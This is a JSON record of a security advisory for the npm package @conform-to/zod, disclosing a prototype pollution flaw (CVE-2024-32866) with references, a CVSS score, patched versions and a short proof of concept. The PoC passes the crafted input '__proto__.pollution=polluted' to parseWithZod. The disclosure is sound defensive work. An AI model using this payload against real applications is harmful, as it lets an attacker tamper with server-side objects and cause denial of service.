{
  "Severity": "HIGH",
  "UpdatedAt": "2024-06-10T20:13:00Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@conform-to/zod"
  },
  "Advisory": {
    "DatabaseId": 242705,
    "Id": "GSA_kwCzR0hTQS02MjRnLThxamctOHF4Zs4AA7QR",
    "GhsaId": "GHSA-624g-8qjg-8qxf",
    "References": [
      {
        "Url": "https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf"
      },
      {
        "Url": "https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32866"
      },
      {
        "Url": "https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117"
      },
      {
        "Url": "https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef"
      },
      {
        "Url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-624g-8qjg-8qxf"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-32866"
      }
    ],
    "Description": "### Summary\nConform allows the parsing of nested objects in the form of `object.property`. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to `parseWith...` functions.\n\n### PoC\n```javascript\nconst { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"zod\"); \n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\", ({}).pollution); // should print \"polluted\"\n```\n\n### Details\n\nThe invocation of the `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext` and `parse`, executing the following process, resulting in prototype pollution:\n\n```javascript\nlet pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = \"polluted\";\n```\n\nThis is caused by the lack of object existence checking on [line 117 in formdata.ts](https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117), where the code only checks for the presence of `pointer[key]` without proper validation.\n\n### Impact\nApplications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-04-23T21:15:55Z",
    "Severity": "HIGH",
    "Summary": "Conform contains a Prototype Pollution Vulnerability in `parseWith...` function",
    "UpdatedAt": "2024-06-10T20:13:00Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.6,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "0.9.2"
      },
      "VulnerableVersionRange": "\u003c 0.9.2"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "1.1.1"
      },
      "VulnerableVersionRange": "\u003e= 1.0.0, \u003c= 1.1.0"
    }
  ]
}